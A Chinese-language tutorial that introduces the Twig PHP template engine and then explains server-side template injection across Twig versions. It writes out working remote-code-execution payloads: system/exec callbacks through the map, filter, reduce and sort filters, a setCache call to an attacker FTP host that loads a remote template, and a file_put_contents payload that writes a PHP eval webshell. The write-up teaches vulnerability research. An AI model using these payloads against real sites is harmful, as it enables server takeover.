Twig 模板引擎注入详解
=============

前言
--

对于整个web学习来说，我们要分语言环境来学习，我们要从语言环境这个大方面下手，跨语言学习难免有一些混乱，

前段时间我们学习完了python的web框架已经他们的一些漏洞基本上学习的差不多了，所以我们要进军php这个大方面，

本篇以Twig模板为开头 ，系统性学习php的一系列的web框架和渲染引擎

Twig 基础
-------

老规矩，这里的基础还是阅读官方文档，以下提到的内容就是带领大家快速入门Twig[Documentation - Twig - The flexible, fast, and secure PHP template engine (symfony.com)](https://twig.symfony.com/doc/2.x/)

### 介绍

Twig 是一个 PHP 模板引擎。 它是由 Symfony 开发人员创建的。 Twig 文件的扩展名为`.html.twig`； 它们是静态数据（例如 HTML 和 Twig 构造）的混合。

**特点：**

- *快速*：Twig 将模板编译为经过优化的简单 PHP 代码。这 与常规PHP代码相比，开销减少到最低。
- *安全*：Twig 具有沙盒模式来评估不受信任的模板代码。这 允许将 Twig 用作用户的应用程序的模板语言 可以修改模板设计。
- *灵活*：Twig 由灵活的词法分析器和解析器提供支持。这允许 开发人员定义自己的自定义标记和筛选器，并创建自己的 DSL。

### Twig和php

PHP 和 Twig 是两个不同的技术，但它们可以一起使用来构建动态的网页。

PHP 是一种脚本语言，它是服务器端语言，可以用来生成动态内容。当 PHP 脚本在服务器上运行时，它会执行一些操作，比如连接到数据库、查询数据、计算和处理数据等，最后将生成的 HTML 代码发送回浏览器。

Twig 是一种模板引擎，它使用 PHP 作为它的模板语言。模板引擎是一种将模板和数据合并生成动态内容的工具。Twig 为开发者提供了一种简单的方式来编写可重用的模板，它使用一些特殊的语法，例如 {{ }} 和 {% %}，来表示变量、控制流、循环等等。

当你使用 Twig 时，你可以编写一些模板文件，将它们存储在服务器上。当浏览器请求一个页面时，PHP 代码将会读取相应的模板文件，并将它们与所需的数据进行合并，生成最终的 HTML 页面并将其发送回浏览器。

因此，可以说 Twig 是一个用于生成 HTML 的 PHP 模板引擎。

我们以下面的例子可以直观的感受出Twig和php的差别

PHP语言：

```php
<?php echo $var ?>
<?php echo htmlspecialchars($var, ENT_QUOTES, 'UTF-8') ?>
```

相比之下，Twig拥有非常简洁的语法，它使得模版更具可读性：

```php
{{ var }}
{{ var|escape }}
{{ var|e }}         {# shortcut to escape a variable #}
```

### 第一个Twig例子

```php
<?php

// 引入Twig模板引擎的自动加载文件
require __DIR__ . '/vendor/autoload.php';

// 引入Twig所需的命名空间
use Twig\Environment;
use Twig\Loader\FilesystemLoader;

// 创建Twig模板文件系统加载器，并指定Twig模板所在的目录
$loader = new FilesystemLoader(__DIR__ . '/templates');

// 创建Twig环境，将Twig加载器传递给它
$twig = new Environment($loader);

// 使用Twig的render方法渲染指定的模板，将渲染结果输出到浏览器
echo $twig->render('first.html.twig', [
    'name' => 'John Doe', 
    'occupation' => 'gardener'
]);
```

### Twig的模板设计

#### 基本语法

一下面的html文件为例

```html

<html>
    <head>
        <title>My Webpage</title>
    </head>
    <body>
        <ul id="navigation">
        {% for item in navigation %}
            <li><a href="{{ item.href }}">{{ item.caption }}</a></li>
        {% endfor %}
        </ul>

        <h1>My Webpage</h1>
        {{ a_variable }}
    </body>
</html>
```

其中：`{% %}`进行逻辑运算，程序运行 `{{ }}`进行打印输出 `{# #}`用于注释

#### 变量

##### 格式

应用程序将变量传入模板中进行处理。变量可以包含你能访问的属性或元素。变量的可视化表现形式很大程度上取决于提供变量的应用程序。你可以使用`.`来访问变量的属性(方法或PHP对象的属性，或PHP数组单元）；也可以使用所谓的"subscript"语法`[]`:

```php
{{ foo.bar }}
{{ foo['bar'] }}
```

当属性中包含`-`中会被识别减号（其他的部分特殊符号也可以被解析），所以我们可以使用`attribute`函数访问变量属性：

```php
{{ attribute(foo, 'data-foo') }}
```

这里 的`{{}}`不属于变量的一部分，这个的`{{}}`只起到输出作用，和jiajn2有所区别。

##### 全局变量(仅在1.x)

以下变量在模板中始终可用：

- `_self`: 引用当前模板；
- `_context`: 引用当前上下文；
- `_charset`: 引用当前字符集；

我们下面会有详细解释。

##### 变量设置

我可以使用set标签

```php
{% set variable_name = value %}
```

实例说明

```php
{% set foo = 'foo' %}
{% set foo = [1, 2] %}
{% set foo = {'foo': 'bar'} %}
```

#### 过滤器

[Filters - Documentation - Twig - The flexible, fast, and secure PHP template engine (symfony.com)](https://twig.symfony.com/doc/2.x/filters/index.html)

变量可以通过**过滤器**修改。筛选器与 按管道符号 （） 变量。可以链接多个过滤器。输出 一个过滤器应用于下一个过滤器。`|`

支持链式操作如下实例一

实例说明：

删除所有带有`name`和title-cases的HTML标签:

```php
{{ name|striptags|title }}
```

过滤器接收由圆括号包裹的参数。这个例子中，加入了一个由逗号分隔的参数列表：

```php
{{ list|join(', ') }}
```

要在一段代码中应用过滤器，需要将它包裹在apply标签中

```php
{% apply upper %}
    This text becomes uppercase
{% endapply %}
```

#### 函数

[Functions - Documentation - Twig - The flexible, fast, and secure PHP template engine (symfony.com)](https://twig.symfony.com/doc/2.x/functions/index.html)

实例调用range函数

```php
{% for i in range(0, 3) %}
    {{ i }},
{% endfor %}
```

#### 控制结构

控制结构是指控制程序流程的所有东西——条件语句（例如 `if`/`elseif`/`else`），`for`循环，以及程序块等等。控制结构出现在 `{% ... %}`块中，这里和`jiajn2`类似。都是进行一个代码的执行（这里我们就是那`jiajn2`来类别方便理解，我们还是要打破python语言的逻辑思维。）

以下面的例子，要显示一个被调用的user变量中提供的users列表，使用for标签

```php
<h1>Members</h1>
<ul>
    {% for user in users %}
        <li>{{ user.username|e }}</li>
    {% endfor %}
</ul>
```

所以我们可以看出，控制结构是`{%...%}`加tags

Twig的标签：[Tags - Documentation - Twig - The flexible, fast, and secure PHP template engine (symfony.com)](https://twig.symfony.com/doc/3.x/tags/index.html)

#### 模板继承

Twig的模板继承就是允许你创建一个基本模板，然后在其上创建一个或多个子模板，以重用基本模板的结构和内容。

我们以下面的`templates/base.html.twig`进行说明。

```php

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}{% endblock %}</title>
</head>

<body>

{% block body %}{% endblock %}

</body>

</html>
```

在本例中，block标记定义子模板可以填充的四个块。所有的块标记都是告诉模板引擎，子模板可以覆盖模板的那些部分。

该布局定义了两个由子代替换的块：`title`和`body`。

```php
{% extends 'base.html.twig' %} //派生的子模板使用extends关键字从基本模板继承。 这两个块定义了自定义文本。

{% block title %}ikun{% endblock %}
{% block body %}
jijijiji
{% endblock %}
```

效果：

```php
<html lang="en">
<head>
    <meta charset="UTF-8">    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ikun</title>
</head>
<body>
jijijiji
</body>
</html>
```

#### 外部模板引入

使用Twig，你可以使用include语句来包含其他模板。 include语句需要一个参数，即要包含的模板的文件路径。例如，如果要包含名为`header.html.twig`的模板，可以使用以下语法：

```php
phpCopy code
{% include 'header.html.twig' %}
```

你还可以传递变量给包含的模板。例如，如果要传递一个名为`title`的变量给`header.html.twig`模板，可以使用以下语法：

```php
csharpCopy code
{% include 'header.html.twig' with {'title': 'My Website'} %}
```

在包含的模板中，您可以使用传递的变量，就像在主模板中一样。例如，你可以在`header.html.twig`中使用以下语法来显示传递的标题：

```php
cssCopy code
<h1>{{ title }}</h1>
```

Twig还允许你使用块来包含其他模板。块是一个命名的区域，可以在主模板和子模板之间共享内容。你可以使用以下语法在主模板中定义一个块：

```php
phpCopy code{% block content %}
    <!-- 内容区域 -->
{% endblock %}
```

在子模板中，你可以使用以下语法来包含父模板中的块内容：

```php
phpCopy code{% extends 'base.html.twig' %}

{% block content %}
    {{ parent() }}
    <!-- 其他内容 -->
{% endblock %}
```

在此示例中，`extends`语句指定要扩展的父模板。在子模板中，`block`语句定义了要包含的块内容。在子模板中，使用`parent()`函数可以访问父模板中的内容，以便您可以在其中添加其他内容。

Twig的SSTI
---------

### 形成原因

开发者使用了没有进行严格的过滤以及使用不恰当的类，我们用下面`Twig-1.x`的例子为例:

```php
<?php

require_once '../Twig-1.35.3/lib/Twig/Autoloader.php';

Twig_Autoloader::register();

$loader=new Twig_Loader_String();

$twig = new Twig_Environment($loader);

echo $twig->render("attack {$_GET['hacker']}");
```

这里的渲染的点是可以被用户控制的，当用户传入hacker这个值的时候，实例化new Twig\_Environment($loader);类中的render属性回渲染整字符串，我们都知道php中的{}是用来区分变量和字符串的，类似于python中的花括号。这样以来，用户输入就可以融合进整个字符串，然后render在对整个字符串进行模板编译和解析。类似jiajn2

和jiajn2类似，我们并不能通过这个种方式触发漏洞

```php
$twig->render("attack {{'hacker'}}", array("hacker" => $_GET["hacker"]));
```

这样就导致了先模板会只对外部双花括号进行转义并不会解析我们的传入值

### 漏洞探测

我们从这张图入手：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-ca601b8d861e2aa75d6bfbd633294b9073082fb4.png)

每种模板引擎都具有自己的语法和解析规则。为了利用模板注入（SSTI）漏洞，攻击者需要针对不同的模板引擎构造特定的负载，并通过请求参数将其传递给目标服务器。如果负载中包含了合适的模板引擎语法，服务器会将其解析并渲染页面，这样攻击者就可以判定该服务器存在 SSTI 漏洞。因此，攻击者需要对不同的模板引擎采用不同的负载构造方式，并通过页面渲染结果检测是否存在 SSTI 漏洞。如果负载未被解析，则可以排除该服务器存在 SSTI 漏洞的可能性。

我们知道Twig模板引擎会解析`{{var}}`并进行输出，{# ..#}会被当作注释不会显得到前端界面，所以可以识别这些语法的自然是Twig模板引擎当我们输入

```php
hacker=Mic{# comment #}{{2*8}}OK
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-14d50a923810b535d1a2b5f41fbd311afb9c027b.png)

符合Twig渲染结果。说明存在Twig的ssti漏洞。

### 不同版本漏洞详解

#### 1.x版本

我们上面的例子就是使用的Twig-1.x版本

SSTI1.php：

```php
<?php

require_once '../Twig-1.35.3/lib/Twig/Autoloader.php';

Twig_Autoloader::register();

$loader=new Twig_Loader_String();

$twig = new Twig_Environment($loader);

echo $twig->render("attack {$_GET['hacker']}");
```

在Twig-1.x版本中，存在三个全局变量:

**`_self`全局变量**

`_self`是一个特殊的全局变量，它**引用了当前模板的实例**。你可以使用`_self`变量来访问当前模板中的块、宏、变量和过滤器等内容，例如：

```php
phpCopy code{% extends _self %}
{% block content %}
    <!-- 这是当前模板的内容 -->
{% endblock %}
```

在上面的示例中，`{% extends _self %}`语句将模板继承自当前模板的实例，也就是说，当前模板的内容将成为继承模板的基础内容。

**`_context`全局变量**

`_context`是一个引用当前上下文的特殊全局变量。上下文是一个包含当前模板中所有可用变量的数组。你可以使用`_context`来访问当前模板中的任何变量，例如：

```php
phpCopy code<!-- 在Twig 1.x模板中使用_context全局变量 -->
<p>Hello, {{ _context.username }}!</p>
```

在上面的示例中，`_context`变量用于引用当前模板中的`username`变量的值，以生成一条简单的问候语。

**`_charset`全局变量**

`_charset`是一个特殊的全局变量，它引用了当前字符集。你可以使用`_charset`变量来指定输出模板的字符集，例如：

```php
phpCopy code<!-- 在Twig 1.x模板中使用_charset全局变量 -->
<meta charset="{{ _charset }}">
```

在上面的示例中，`_charset`变量被用于设置输出模板的字符集。

总的来说，在Twig 1.x版本中，`_self`、`_context`和`_charset`这三个全局变量都是特殊的变量，用于引用当前模板、上下文和字符集等信息。虽然这些变量在Twig 2.x中已经被淘汰，但在Twig 1.x中它们仍然是非常有用的。

**三个全局变量涉及的源码**：

```php
protected $specialVars = [
        '_self' => '$this',
        '_context' => '$context',
        '_charset' => '$this->env->getCharset()',
    ];
```

为了实现Twig-1.x版本的SSTI漏洞，我们主要是运用了`_self`变量。

当模板代码中使用 \_self 变量时，它会返回当前的 \\Twig\\Template 实例。这个实例对象包含了一个指向 Twig\_Environment 的 env 属性，我们可以通过它继续调用 Twig\_Environment 中的其他方法。因此，通过在模板代码中使用 \_self 变量和 env 属性，攻击者可以构造任意代码执行的攻击载荷，从而进行 SSTI 攻击。

在`env`属性下存在许多的方法比如`setCache` `getFilter`等方法

##### setCache()

源码：

```php
 public function setCache($cache)
    {
        if (is_string($cache)) {
            $this->originalCache = $cache;
            $this->cache = new Twig_Cache_Filesystem($cache);
        } elseif (false === $cache) {
            $this->originalCache = $cache;
            $this->cache = new Twig_Cache_Null();
        } elseif (null === $cache) {
            @trigger_error('Using "null" as the cache strategy is deprecated since version 1.23 and will be removed in Twig 2.0.', E_USER_DEPRECATED);
            $this->originalCache = false;
            $this->cache = new Twig_Cache_Null();
        } elseif ($cache instanceof Twig_CacheInterface) {
            $this->originalCache = $this->cache = $cache;
        } else {
            throw new LogicException(sprintf('Cache can only be a string, false, or a Twig_CacheInterface implementation.'));
        }
    }
```

稍加解释:该方法接受一个参数`$cache`，可以是以下三种:字符串，false和null用于保存传递给`setCache()`方法的原始缓存选项。这个属性在后面可能会被用来做一些缓存清理的工作。最终，`setCache()`方法会将解析后的缓存选项存储在`$cache`属性中，以便其他方法可以使用它。从而改变了Twig的php文件路径。

因此构造以下的payload

```php
{{_self.env.setCache("ftp://attacker.net:xxxx")}}
```

这里将Twig的缓存选项设置为了一个远程FTP地址`ftp://attacker.net:xxxx`导致Twig在将模板下载到本地缓存之前，尝试从指定的FTP地址下载模板，当我们控制这个地址，就可以将恶意代码植入模板中，进行攻击。植入后再加载模板

```php
{{_self.env.loadTemplate("恶意模板名")}}
```

实现攻击。

##### getFilter()

源码：

```php
    public function getFilter($name)
    {
        if (!$this->extensionInitialized) {
            $this->initExtensions();
        }

        if (isset($this->filters[$name])) {
            return $this->filters[$name];
        }

        foreach ($this->filters as $pattern => $filter) {
            $pattern = str_replace('\\*', '(.*?)', preg_quote($pattern, '#'), $count);

            if ($count) {
                if (preg_match('#^'.$pattern.'$#', $name, $matches)) {
                    array_shift($matches);
                    $filter->setArguments($matches);

                    return $filter;
                }
            }
        }

        foreach ($this->filterCallbacks as $callback) {
            if (false !== $filter = call_user_func($callback, $name)) {
                return $filter;
            }
        }

        return false;
    }

    public function registerUndefinedFilterCallback($callable)
    {
        $this->filterCallbacks[] = $callable;
    }
```

我们发现1149行中有call\_user\_func这个危险函数

```php
        foreach ($this->filterCallbacks as $callback) {
            if (false !== $filter = call_user_func($callback, $name)) {
                return $filter;
            }
```

所以我们只需要给$callback和$name赋值就可以实现命令执行，$callback的赋值需要通过调用registerUndefinedFilterCallback()方法。

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

```php
public function getGlobals()
{
    if (!$this->runtimeInitialized && !$this->extensionInitialized) {
        return $this->initGlobals();
    }

    if (null === $this->globals) {
        $this->globals = $this->initGlobals();
    }

    return $this->globals;
}
```

#### 2.x&amp;3.x版本

在2.x及以后的版本中已经停用了全局变量`__self`所以我们就可以使用一些过滤器来进行攻击

实例:

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$template = $twig->createTemplate("Hello {$_GET['name']}!");

echo $template->render();
```

##### map过滤器

我们先来看map的源码：

```php
function twig_array_map($array, $arrow)
{
    $r = [];
    foreach ($array as $k => $v) {
        $r[$k] = $arrow($v, $k);    
    }

    return $r;
}
```

关键部分

```php
$r[$k] = $arrow($v, $k);    
```

这里如果说，$arrow我们的用户可控，那么传入的 `$arrow``的值就会直接被当成函数执行，后面的$array就会充当他的参数($v和$k分别作为$array的键和值)。

所以我们下一个目标就是找到具有两个参数并且可以进行命令执行的函数，来进行rce，或者可以执行文件的函数来执行我们上传的木马。

```php
system ( string $command [, int &$return_var ] ) : string
passthru ( string $command [, int &$return_var ] )
exec ( string $command [, array &$output [, int &$return_var ]] ) : string
file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) : int
```

所以我们构造payload就可以进行rce了

```php
{{["ls"]|map("system")}}
```

```php
{{{"<?php @eval($_POST['attack']);?>":"文件地址"}|map("file_put_contents")}}
```

##### filer过滤器

作用：这个 `filter` 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值

```php
{% set lists = [34, 36, 38, 40, 42] %}
{{ lists|filter(v => v > 38)|join(', ') }}

// Output: 40, 42
```

Twig将上述的语言编译成

```php
<?php echo implode(', ', array_filter($context["lists"], function ($__value__) { return ($__value__ > 38); })); ?>
```

我们可以发现调用了array\_filter（）的危险函数，下面我们来详细阅读关于array\_filter函数的源码

filer过滤器源码：

```php
/**
 * Filters an array or iterator using a callback function.
 *
 * @param array|\Traversable $array The array or iterator to filter
 * @param callable $arrow The callback function to use as a filter
 *
 * @return array|CallbackFilterIterator The filtered array or iterator
 */
function twig_array_filter($array, $arrow)
{
    if (\is_array($array)) {
        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    
    }
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
}
```

根据源码可得，`$array` 和 `$arrow` 将作为参数直接传递给 `array_filter()` 函数。该函数可以使用回调函数过滤数组中的元素。如果我们自定义一个恶意的回调函数，可能会导致代码执行或命令执行等安全问题。

array\_filter() 函数用回调函数过滤数组中的值。

```php
array_filter(array,callbackfunction);
```

| 参数 | 描述 |
|---|---|
| *array* | 必需。规定要过滤的数组。 |
| *callbackfunction* | 必需。规定要使用的回调函数。 |

array可以作为*callbackfunction*得参数来执行，

演示payload：

```php
{{["id"]|filter("system")}}
{{["id"]|filter("passthru")}}
```

##### reduce 过滤器

`reduce` 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值。箭头函数接收上一次迭代的返回值和序列或映射的当前值：

```php
{% set numbers = [1, 2, 3] %}
{{ numbers|reduce((carry, v) => carry + v) }}
```

编译结果

```php
<?php
echo twig_reduce_filter($this->env, $context["numbers"], function ($carry, $v) { return $carry + $v; });
?>
```

我们发现和map过滤器一样，同样将输入的变量引导了twig\_reduce\_filter中

下面是reduce中有关twig\_reduce\_filter函数的源码

```php
function twig_reduce_filter($array, $arrow, $initial = null)
{
    if (!\is_array($array)) {
        $array = iterator_to_array($array);
    }

    return array_reduce($array, $arrow, $initial);    
}
```

$array, $arrow 和 $initial 直接被 array\_reduce 函数调用`array_reduce` 函数可以发送数组中的值到用户自定义函数，并返回一个字符串。如果我们自定义一个危险函数，将造成代码执行或命令执行。

```php
{{[0, 0]|reduce("system", "id")}}
```

##### sort 过滤器

作用，对数组进行排序

可以传递一个箭头函数来对数组进行排序：

```php
{% set fruits = [
    { name: 'Apples', quantity: 5 },
    { name: 'Oranges', quantity: 2 },
    { name: 'Grapes', quantity: 4 },
] %}

{% for fruit in fruits|sort((a, b) => a.quantity <=> b.quantity)|column('name') %}
    {{ fruit }}
{% endfor %}

```

编译结果

```php
<?php
$context['_parent'] = $context;
$context['_seq'] = twig_ensure_traversable(twig_sort_filter($this->env, $context["fruits"], function ($a, $b) { return ($a["quantity"] <=> $b["quantity"]); }));
foreach ($context['_seq'] as $context["_key"] => $context["fruit"]) {
    // column()过滤器将返回值为$name的fruit['name']并输出
    echo twig_escape_filter($this->env, twig_get_attribute($this->env, $this->getSourceContext(), $context["fruit"], "name", [], "array", false, false, true, 13), "html", null, true);
}

```

这时我们可以注意到twig\_sort\_filter()这个函数

```php
twig_sort_filter($this->env, $context["fruits"], function ($a, $b) { return ($a["quantity"] <=> $b["quantity"]); })
```

下面时sort 过滤器关于twig\_sort\_filter()函数的那个源码了，

```php
function twig_sort_filter($array, $arrow = null)
{
    if ($array instanceof \Traversable) {
        $array = iterator_to_array($array);
    } elseif (!\is_array($array)) {
        throw new RuntimeError(sprintf('The sort filter only works with arrays or "Traversable", got "%s".', \gettype($array)));
    }

    if (null !== $arrow) {
        uasort($array, $arrow);  
    } else {
        asort($array);
    }

    return $array;
}
```

漏洞部分

```php
 if (null !== $arrow) {
        uasort($array, $arrow);  
}
```

uasort() 函数使用用户自定义的比较函数对数组 $arr 中的元素按键值进行排序，在这段代码中，$array, $arrow这两个变量了同时可以使用用户自定义的比较函数对数组中的元素按键值进行排序，我们就可以传入包含函数参数的列表，进行命令执行了。

```php
{{["id", 0]|sort("system")}}
```

- - - - - -

参考

[Twig模板注入攻击(SSTI)的原理和扫描检测方法 - 米兰百分百 (milan100.com)](http://www.milan100.com/article/show/1547)

[TWIG 全版本通用 SSTI payloads - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7518#toc-5)

[Home - **Twig** - The flexible, fast, and secure PHP template …](https://twig.symfony.com/)

[以Twig模板为例浅学一手SSTI\_合天网安实验室的博客-CSDN博客](https://blog.csdn.net/qq_38154820/article/details/122007662)